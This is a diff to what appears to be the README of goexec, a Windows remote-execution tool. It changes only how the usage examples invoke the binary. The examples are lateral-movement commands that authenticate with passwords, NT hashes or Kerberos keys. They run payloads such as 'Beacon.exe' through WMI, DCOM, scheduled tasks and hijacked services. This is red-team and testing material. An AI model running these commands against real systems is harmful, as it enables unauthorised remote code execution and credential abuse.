@@ -148,13 +148,13 @@ Execution:
 
 ```shell
 # Run an executable without arguments
-./goexec wmi proc "$target" \
+goexec wmi proc "$target" \
   -u "$auth_user" \
   -p "$auth_pass" \
   -e 'C:\Windows\Temp\Beacon.exe' \
 
 # Authenticate with NT hash, fetch output from `cmd.exe /c whoami /all`
-./goexec wmi proc "$target" \
+goexec wmi proc "$target" \
   -u "$auth_user" \
   -H "$auth_nt" \
   -e 'cmd.exe' \
@@ -183,7 +183,7 @@ WMI:
 
 ```shell
 # Call StdRegProv.EnumKey - enumerate registry subkeys of HKLM\SYSTEM
-./goexec wmi call "$target" \
+goexec wmi call "$target" \
     -u "$auth_user" \
     -p "$auth_pass" \
     -C 'StdRegProv' \
@@ -245,7 +245,7 @@ Execution:
 
 ```shell
 # Authenticate with NT hash, fetch output from `cmd.exe /c whoami /priv` to file
-./goexec dcom mmc "$target" \
+goexec dcom mmc "$target" \
   -u "$auth_user" \
   -H "$auth_nt" \
   -e 'cmd.exe' \
@@ -285,7 +285,7 @@ The app window argument (`--app-window`) must be one of the values described [he
 
 ```shell
 # Authenticate with local admin NT hash, execute `netstat.exe -anop tcp` w/ output
-./goexec dcom shellwindows "$target" \
+goexec dcom shellwindows "$target" \
   -u "$auth_user" \
   -H "$auth_nt" \
   -e 'netstat.exe' \
@@ -293,7 +293,7 @@ The app window argument (`--app-window`) must be one of the values described [he
   -o- # write to standard output
 
 # Authenticate with local admin password, open maximized notepad window on desktop
-./goexec dcom shellwindows "$target" \
+goexec dcom shellwindows "$target" \
   -u "$auth_user" \
   -p "$auth_pass" \
   -e 'notepad.exe' \
@@ -327,7 +327,7 @@ Execution:
 
 ```shell
 # Authenticate with NT hash, open explorer.exe maximized
-./goexec dcom shellbrowserwindow "$target" \
+goexec dcom shellbrowserwindow "$target" \
   -u "$auth_user@$domain" \
   -H "$auth_nt" \
   -e 'explorer.exe' \
@@ -394,7 +394,7 @@ Execution:
 # Authenticate with NT hash via Kerberos, 
 #   register task at \Microsoft\Windows\GoExec,
 #   execute `C:\Windows\Temp\Beacon.exe`
-./goexec tsch create "$target" \
+goexec tsch create "$target" \
   --user "${auth_user}@${domain}" \
   --nt-hash "$auth_nt" \
   --dc "$dc_ip" \
@@ -405,7 +405,7 @@ Execution:
 # Authenticate using Kerberos AES key,
 #   execute `C:\Windows\Temp\Seatbelt.exe -group=system`,
 #   collect output with lengthened (5 minute) timeout
-./goexec tsch create "$target" \
+goexec tsch create "$target" \
   --user "${auth_user}@${domain}" \
   --dc "$dc_ip" \
   --aes-key "$auth_aes" \
@@ -442,7 +442,7 @@ Execution:
 
 ```shell
 # Use random task name, execute `notepad.exe` on desktop session 1
-./goexec tsch demand "$target" \
+goexec tsch demand "$target" \
   --user "$auth_user" \
   --password "$auth_pass" \
   --exec 'notepad.exe' \
@@ -451,7 +451,7 @@ Execution:
 # Authenticate with NT hash via Kerberos,
 #   register task at \Microsoft\Windows\GoExec (will be deleted),
 #   execute `C:\Windows\System32\cmd.exe /c set` with output
-./goexec tsch demand "$target" \
+goexec tsch demand "$target" \
   --user "${auth_user}@${domain}" \
   --nt-hash "$auth_nt" \
   --dc "$dc_ip" \
@@ -492,7 +492,7 @@ Execution:
 
 ```shell
 # Enable debug logging, Modify "\Microsoft\Windows\UPnP\UPnPHostConfig" to run `cmd.exe /c whoami /all` with output
-./goexec tsch change $target --debug \
+goexec tsch change $target --debug \
   -u "${auth_user}" \
   -p "${auth_pass}" \
   -t '\Microsoft\Windows\UPnP\UPnPHostConfig' \
@@ -595,7 +595,7 @@ Execution:
 
 ```shell
 # Used named pipe transport, Modify the PlugPlay service to execute `C:\Windows\System32\cmd.exe /c C:\Windows\Temp\stage.bat`
-./goexec scmr change $target \
+goexec scmr change $target \
   -u "$auth_user" \
   -p "$auth_pass" \
   -F "ncacn_np:" \
